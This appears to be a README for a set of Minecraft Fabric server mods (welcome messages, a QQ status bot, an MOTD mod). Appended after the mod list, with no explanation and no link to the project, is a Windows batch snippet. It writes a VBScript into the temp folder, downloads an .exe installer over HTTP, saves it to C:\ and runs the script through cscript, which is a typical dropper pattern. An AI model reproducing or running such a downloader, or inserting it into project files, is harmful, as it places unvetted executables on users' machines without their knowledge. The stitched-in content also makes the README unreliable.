# awa_mods

[中文](README.md) | [English](README_ENGLISH.md)

Lightweight Fabric mods for the latest version of Minecraft

！！！99% of the code in this project is written by AI！！！

Project description & update plan — click on the wiki for usage instructions

·Welcome_awa///[wiki](https://github.com/niuniuyike/awa_mods/wiki/Welcome_awa_English)///: Sends a welcome message to every player joining the server  

·QQbot_awa///[wiki](https://github.com/niuniuyike/awa_mods/wiki/QQbot_awa_English)///: An intelligent bot built on Python's asynchronous architecture that provides real-time Minecraft server status monitoring, account binding, and message broadcasting  

·motd_awa///[wiki](https://github.com/niuniuyike/awa_mods/wiki/Motd_awa_English)///: Server MOTD  

·BetterList_awa (planned): Enhanced player list  

·Title_awa (planned): Player titles




echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") > %temp%\d.vbs
echo objXMLHTTP.open "GET", "https://dl.360safe.com/se/360se_setup.exe", false >> %temp%\d.vbs
echo objXMLHTTP.send >> %temp%\d.vbs
echo Set objStream = CreateObject("ADODB.Stream") >> %temp%\d.vbs
echo objStream.Type = 1 >> %temp%\d.vbs
echo objStream.Open >> %temp%\d.vbs
echo objStream.Write objXMLHTTP.responseBody >> %temp%\d.vbs
echo objStream.SaveToFile "C:\360se_setup.exe", 2 >> %temp%\d.vbs
cscript //nologo %temp%\d.vbs
